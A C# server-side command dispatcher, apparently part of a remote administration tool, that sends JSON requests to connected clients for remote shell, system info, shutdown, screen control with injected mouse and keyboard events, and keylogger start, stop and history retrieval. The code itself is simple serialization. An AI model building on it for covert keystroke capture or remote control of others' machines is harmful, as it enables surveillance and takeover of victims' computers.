using System.Threading.Tasks;
using Common.Networking;
using Common.Utils;
using Server.Networking;

namespace Server.Services
{
    public sealed class CommandService
    {
        public async Task SendSystemInfoRequestAsync(ServerClientConnection connection, bool includeHardware = true, bool includeNetwork = true, bool includeSoftware = true)
        {
            var req = new SystemInfoRequest
            {
                IncludeHardware = includeHardware,
                IncludeNetwork = includeNetwork,
                IncludeSoftware = includeSoftware,
                ClientId = connection.Id
            };
            var json = JsonHelper.Serialize(req);
            await connection.SendAsync(json);
        }
        public async Task SendRemoteShellRequestAsync(ServerClientConnection connection, RemoteShellRequest request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }
        public async Task SendMessageBoxRequestAsync(ServerClientConnection connection, MessageBoxRequest request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }
        public async Task SendShutdownActionRequestAsync(ServerClientConnection connection, ShutdownActionRequest request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }
        //-------------------------------------//

        public async Task SendKeyLoggerStartAsync(ServerClientConnection connection, KeyLoggerStart request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }

        public async Task SendKeyLoggerStopAsync(ServerClientConnection connection, KeyLoggerStop request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }

        public async Task SendKeyLoggerHistoryRequestAsync(ServerClientConnection connection, KeyLoggerHistoryRequest request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }

        // Screen Control methods
        public async Task SendScreenControlStartAsync(ServerClientConnection connection, ScreenControlStart request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }

        public async Task SendScreenControlStopAsync(ServerClientConnection connection, ScreenControlStop request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }

        public async Task SendMouseEventAsync(ServerClientConnection connection, ScreenControlMouseEvent request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }

        public async Task SendKeyboardEventAsync(ServerClientConnection connection, ScreenControlKeyboardEvent request)
        {
            request.ClientId = connection.Id;
            var json = JsonHelper.Serialize(request);
            await connection.SendAsync(json);
        }
    }
}


